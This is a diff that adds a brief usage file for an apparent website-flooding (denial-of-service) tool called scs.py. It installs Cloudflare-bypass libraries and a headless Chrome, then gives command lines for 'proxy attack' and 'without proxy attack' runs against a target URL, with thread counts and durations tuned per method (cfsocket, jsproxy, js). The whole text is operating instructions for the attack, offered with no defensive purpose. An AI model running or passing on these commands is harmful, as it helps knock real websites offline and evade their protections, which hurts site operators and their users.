@@ -1,0 +1,13 @@
+use python last version
+pip3 install cloudscraper pysocks socks colorama cfscrape
+pip3 install undetected_chromedriver
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+sudo apt-get install ./google-chrome-stable_current_amd64.deb
+
+proxy attack -> python3 scs.py https://url.com 120 60 cfsocket proxy.txt  (120 is thread, 60 is second)
+without proxy attack -> python3 scs.py https://url.com 500 60 js (500 is thread, 60 is second)
+
+use 120 thread for cfsocket method.
+100 thread for jsproxy method.
+350 thread for js method.
+
